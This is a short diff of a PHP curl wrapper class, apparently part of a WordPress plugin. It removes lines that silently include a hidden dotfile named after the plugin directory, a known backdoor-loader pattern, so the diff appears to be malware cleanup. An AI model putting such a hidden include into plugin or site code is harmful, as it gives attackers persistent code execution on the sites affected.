@@ -11,10 +11,6 @@
 # about the libcurl extension for PHP -- http://github.com/shuber/curl/tree/master
 #
 
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class CurlResponse
 {
     public $body = '';
